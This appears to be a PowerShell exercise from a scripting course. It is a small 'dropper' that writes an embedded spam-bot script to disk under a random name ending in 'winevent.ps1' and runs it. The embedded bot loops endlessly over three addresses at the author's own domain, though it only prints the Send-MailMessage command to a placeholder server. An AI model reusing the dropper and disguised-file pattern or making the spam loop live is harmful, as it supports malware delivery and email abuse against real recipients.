# Storyline Dropper for our spambot that wiull save to a directory and execute


$writeSbBot = @'

# Send an email using powershell

$toSend = @('abijah.buttendorf@myail.champlain.edu', 'abijah@myail.champlain.edu', 'buttendorf@myail.champlain.edu')

# Message body
$msg = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

# Send the email

while($true) {

    foreach ($email in $toSend) {

        write-host "Send-MailMessage -from 'abijah.buttendorf@myail.champlain.edu' -To $email -Subject 'Tisk Tisk' `
        -Body $msg -SmtpServer X.X.X.X"
        
        #Pause to save PC
        start-sleep 1
    }
}
'@

# Target Directory
$sbDir = 'C:\Users\abija\Documents\VisualStudio\SYS-320-Automation\Week11\class\'

# Create a random number to add to the file.
$sbRand = Get-Random -Minimum 1000 -Maximum 1999

# Create the file and location to save bot
$file = $sbDir + $sbRand + "winevent.ps1"

#write
$writeSbBot | Out-File -FilePath $file

# Execute File
Invoke-Expression $file